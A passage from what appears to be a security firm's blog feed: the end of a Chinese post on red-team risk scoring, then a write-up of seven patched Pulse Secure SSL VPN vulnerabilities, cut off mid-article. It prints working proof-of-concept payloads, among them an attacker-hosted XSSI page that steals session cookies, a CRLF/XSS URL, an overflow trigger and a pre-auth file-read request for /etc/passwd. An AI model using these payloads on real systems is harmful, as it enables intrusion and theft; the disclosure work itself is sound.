      &lt;td style=&quot;text-align: left&quot;&gt;本文 4.2 關注方之需要與期望&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;不同系統使用相同帳號密碼&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.9.4.3 通行碼管理系統&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;管理帳號存在密碼規則&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.9.4.3 通行碼管理系統&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;AD 重大漏洞未修補&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.12.6.1 技術脆弱性管理&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;未限制來源 IP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.9.4.1 系統存取限制&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;次要網站防護不足&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.14.1.1 資訊安全要求事項分析及規格&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;VPN 網段存取內部系統&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;附錄 A.13.1.3 網路區隔&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;另外，從演練的結果可以發現下表項次 1 及項次 2 的機率都被證實會發生且位於入侵核心資產的路徑上，因此衝擊及機率均應該由原本的 2 提升為 3，這導致項次 1 的風險值超過了企業原本設定的可接受風險 (27)；另外，儘管在演練結果中清楚的知道項次 2 的內部差勤系統是必然可以成功入侵且間接控制核心資產的系統，其風險值仍遠低於企業會進行處理的風險，這正是我們前面所提到低估戰略價值的問題，因此我們會建議，&lt;strong&gt;在紅隊演練路徑上可以獲得核心資產的風險項目，都應該視為不可接受風險來進行處理&lt;/strong&gt;。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;項次&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;資產名稱&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;價值&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;威脅&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;弱點&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;衝擊&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;機率&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;風險&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;版本更新系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;未經授權存取&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;橫向移動&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;內部差勤系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;系統入侵&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;無法上 patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;9&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;最後，引用 &lt;a href=&quot;/blog/author/shaolin/&quot;&gt;Shaolin&lt;/a&gt; 在研討會上的結語&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;紅隊演練的精髓不是在告訴你有多脆弱，在於真正壞人闖入時你可以獨當一面擋下。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;希望各位都能找到可以持續改善防禦策略的方法，讓企業的環境更加安全。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/10/09/def-strategy/</link>
                <guid>https://devco.re/blog/2019/10/09/def-strategy</guid>
                <pubDate>Wed, 09 Oct 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!</title>
                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Hi, this is the last part of Attacking SSL VPN series. If you haven’t read previous articles yet, here are the quick links for you:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After we published our research at Black Hat, due to its great severity and huge impacts, it got lots of attention and discussions. Many people desire first-hand news and wonder when the exploit(especially the Pulse Secure preAuth one) will be released.&lt;/p&gt;

&lt;p&gt;We also discussed this internally. Actually, we could simply drop the whole exploits without any concern and acquire plenty of media exposures. However, as a SECURITY firm, our responsibility is to make the world more secure. So we decided to postpone the public disclosure to give the world more time to apply the patches!&lt;/p&gt;

&lt;p&gt;Unfortunately, the exploits were revealed by someone else. They can be easily found on GitHub&lt;sup&gt;&lt;a href=&quot;https://github.com/milo2012/CVE-2018-13379&quot;&gt;[1]&lt;/a&gt; &lt;a href=&quot;https://github.com/milo2012/CVE-2018-13382&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://github.com/projectzeroindia/CVE-2019-11510&quot;&gt;[3]&lt;/a&gt;&lt;/sup&gt; and exploit-db&lt;sup&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47297&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt;. Honestly, we couldn’t say they are wrong, because the bugs are absolutely fixed several months ago, and they spent their time differing/reversing/reproducing. But it’s indeed a worth discussing question to the security community: if you have a nuclear level weapon, when is it ready for public disclosure?&lt;/p&gt;

&lt;p&gt;We heard about more than 25 bug bounty programs are exploited. From the statistics of &lt;a href=&quot;https://badpackets.net/over-14500-pulse-secure-vpn-endpoints-vulnerable-to-cve-2019-11510/&quot;&gt;Bad Packet&lt;/a&gt;, numerous Fortune 500, U.S. military, governments, financial institutions and universities are also affected by this. There are even &lt;a href=&quot;https://twitter.com/sherlocksecure/status/1164492373591642112&quot;&gt;10 NASA servers exposed for this bug&lt;/a&gt;. So, these premature public disclosures indeed force these entities to upgrade their SSL VPN, this is the good part.&lt;/p&gt;

&lt;p&gt;On the other hand, the bad part is that there is an increasing number of &lt;a href=&quot;https://www.securityweek.com/hackers-target-vulnerabilities-fortinet-pulse-secure-products&quot;&gt;botnets&lt;/a&gt; scanning the Internet in the meanwhile. An &lt;a href=&quot;https://twitter.com/GossiTheDog/status/1167170305577689091&quot;&gt;intelligence&lt;/a&gt; also points out that there is already a China APT group exploiting this bug. This is such an Internet disaster. Apparently, the world is not ready yet. So, if you haven’t updated your Palo Alto, Fortinet or Pulse Secure SSL VPN, please update it ASAP!&lt;/p&gt;

&lt;h1 id=&quot;about-pulse-secure&quot;&gt;About Pulse Secure&lt;/h1&gt;

&lt;p&gt;Pulse Secure is the market leader of SSL VPN which provides professional secure access solutions for Hybrid IT. Pulse Secure has been in our research queue for a long time because it was a &lt;a href=&quot;https://archive.li/8pzwf&quot;&gt;critical infrastructure of Google&lt;/a&gt;, which is one of our long-term targets. However, Google applies the Zero Trust security model, and therefore the VPN is removed now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We started to review Pulse Secure in mid-December last year. In the first 2 months, we got nothing. Pulse Secure has a good coding style and security awareness so that it’s hard to find trivial bugs. Here is an interesting comparison, we found the arbitrary file reading &lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt; on FortiGate SSL VPN on our first research day…&lt;/p&gt;

&lt;p&gt;Pulse Secure is also a Perl lover, and writes lots of Perl extensions in C++. The interaction between Perl and C++ is also confusing to us, but we got more familiar with it while we paid more time digging in it. Finally, we got the first blood on &lt;strong&gt;March 8, 2019&lt;/strong&gt;! It’s a stack-based overflow on the management interface! Although this bug isn’t that useful, our research progress got on track since that, and we uncovered more and more bugs.&lt;/p&gt;

&lt;p&gt;We reported all of our finding to Pulse Secure PSIRT on &lt;strong&gt;March 22, 2019&lt;/strong&gt;. Their response is very quick and they take these vulnerabilities seriously! After several conference calls with Pulse Secure, &lt;strong&gt;they fixed all bugs just within a month&lt;/strong&gt;, and released the patches on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. You can check the detailed &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/&quot;&gt;security advisory&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;It’s a great time to work with Pulse Secure. From our perspective, Pulse Secure is the most responsible vendor among all SSL VPN vendors we have reported bugs to!&lt;/p&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;We have found 7 vulnerabilities in total. Here is the list. We will introduce each one but focus on the CVE-2019-11510 and CVE-2019-11539 more.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;affected-versions&quot;&gt;Affected versions&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;cve-2019-11540-cross-site-script-inclusion&quot;&gt;CVE-2019-11540: Cross-Site Script Inclusion&lt;/h2&gt;

&lt;p&gt;The script &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/cs/cs.cgi&lt;/code&gt; renders the session ID in JavaScript. As the content-type is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;application/x-javascript&lt;/code&gt;, we could perform the XSSI attack to steal the DSID cookie!&lt;/p&gt;

&lt;p&gt;Even worse, the CSRF protection in Pulse Secure SSL VPN is based on the DSID. With this XSSI, we can bypass all the CSRF protection!&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- http://attacker/malicious.html --&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/dana/cs/cs.cgi?action=appletobj&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;writeln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DSID&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;ReplaceContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11507-cross-site-scripting&quot;&gt;CVE-2019-11507: Cross-Site Scripting&lt;/h2&gt;

&lt;p&gt;There is a CRLF Injection in &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/home/cts_get_ica.cgi&lt;/code&gt;. Due to the injection, we can forge arbitrary HTTP headers and inject malicious HTML contents.&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana/home/cts_get_ica.cgi
?bm_id=x
&amp;amp;vdi=1
&amp;amp;appname=aa%0d%0aContent-Type::text/html%0d%0aContent-Disposition::inline%0d%0aaa:bb&amp;lt;svg/onload=alert(document.domain)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11538-post-authuser-arbitrary-file-reading-via-nfs&quot;&gt;CVE-2019-11538: Post-auth(user) Arbitrary File Reading via NFS&lt;/h2&gt;

&lt;p&gt;The following two vulnerabilities (CVE-2019-11538 and CVE-2019-11508) do not affect default configurations. It appears only if the admin configures the NFS sharing for the VPN users.&lt;/p&gt;

&lt;p&gt;If an attacker can control any files on remote NFS server, he can just create a symbolic link to any file, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, and read it from web interface. The root cause is that the implementation of NFS mounts the remote server as a real Linux directory, and the script &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/fb/nfs/nfb.cgi&lt;/code&gt; does not check whether the accessed file is a symlink or not!&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11508-post-authuser-arbitrary-file-writing-via-nfs&quot;&gt;CVE-2019-11508: Post-auth(user) Arbitrary File Writing via NFS&lt;/h2&gt;

&lt;p&gt;This one is a little bit similar to the previous one, but with a different attack vector!&lt;/p&gt;

&lt;p&gt;When the attacker uploads a ZIP file to the NFS through the web interface, the script &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/fb/nfs/nu.cgi&lt;/code&gt; does not sanitize the filename in the ZIP. Therefore, an attacker can build a malicious ZIP file and traverse the path with &lt;code class=&quot;highlighter-rouge&quot;&gt;../&lt;/code&gt; in the filename! Once Pulse Secure decompresses, the attacker can upload whatever he wants to whatever path!&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11542-post-authadmin-stack-buffer-overflow&quot;&gt;CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow&lt;/h2&gt;

&lt;p&gt;There is a stack-based buffer overflow in the following Perl module implementations:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DSHC::ConsiderForReporting&lt;/li&gt;
  &lt;li&gt;DSHC::isSendReasonStringEnabled&lt;/li&gt;
  &lt;li&gt;DSHC::getRemedCustomInstructions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These implementations use &lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; to concatenate strings without any length check, which leads to the buffer overflow. The bug can be triggered in many places, but here we use &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana-admin/auth/hc.cgi&lt;/code&gt; as our PoC.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana-admin/auth/hc.cgi
?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&amp;amp;policyid=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And you can observed the segment fault from &lt;code class=&quot;highlighter-rouge&quot;&gt;dmesg&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cgi-server[22950]: segfault at 61616161 ip 0000000002a80afd sp 00000000ff9a4d50 error 4 in DSHC.so[2a2f000+87000]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11510-pre-auth-arbitrary-file-reading&quot;&gt;CVE-2019-11510: Pre-auth Arbitrary File Reading&lt;/h2&gt;

&lt;p&gt;Actually, this is the most severe bug in this time. It is in the web server implementation. As our slides mentioned, Pulse Secure implements their own web server and architecture stack from scratch. The original path validation is very strict. However, since version 8.2, Pulse Secure introduced a new feature called &lt;code class=&quot;highlighter-rouge&quot;&gt;HTML5 Access&lt;/code&gt;, it’s a feature used to interact with Telnet, SSH, and RDP by browsers. Thanks to this new feature, the original path validation becomes loose.&lt;/p&gt;

&lt;p&gt;In order to handle the static resources, Pulse Secure created a new IF-CONDITION to widen the originally strict path validation. The code wrongly uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;request-&amp;gt;uri&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt;, so that we can specify the &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the end of the query string to bypass the validation and make &lt;code class=&quot;highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt; to any file you want to download!&lt;/p&gt;

&lt;p&gt;And it’s worth to mention that in order to read arbitrary files, you must to specify the &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the middle of the path again. Otherwise, you can only download limited file extensions such as .json, .xml or .html.&lt;/p&gt;

&lt;p&gt;Due to the exploit is in the wild, there is no longer any concern to show the payload:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11539-post-authadmin-command-injection&quot;&gt;CVE-2019-11539: Post-auth(admin) Command Injection&lt;/h2&gt;

&lt;p&gt;The last one is a command injection on the management interface. We found this vulnerability very early, but could not find a way to exploit it at first. While we were in Vegas, one of my friends told me that he found the same bug before, but he didn’t find a way to exploit it, so he didn’t report to the vendor.&lt;/p&gt;

&lt;p&gt;However, we did it, and we exploit it in a very smart way :)&lt;/p&gt;

&lt;p&gt;The root cause of this vulnerability is very simple. Here is a code fragment of &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana-admin/diag/diag.cgi&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;CGI::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;options&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$TCPDUMP_COMMAND -d $options &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;undef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s so obvious and straightforward that everyone can point out there is a command injection at the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;options&lt;/code&gt;! However, is it that easy? No!&lt;/p&gt;

&lt;p&gt;In order to avoid potential vulnerabilities, Pulse Secure applies lots of hardenings on their products! Such as the system integrity check, read-only filesystem and a module to hook all dangerous Perl invocations like &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;open&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;backtick&lt;/code&gt;…&lt;/p&gt;

&lt;p&gt;This module is called &lt;code class=&quot;highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt;. It implements its own command line parser and re-implements the I/O redirections in Perl. Here is &lt;a href=&quot;https://gist.github.com/orangetw/d8df11b147629bb320e7db903c7e7147&quot;&gt;the code fragments on Gist&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;From the code fragments, you can see it replaces the original &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; and do lots of checks in &lt;code class=&quot;highlighter-rouge&quot;&gt;__parsecmd&lt;/code&gt;. It also blocks numerous bad characters such as:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[\&amp;amp;\*\(\)\{\}\[\]\`\;\|\?\n~&amp;lt;&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

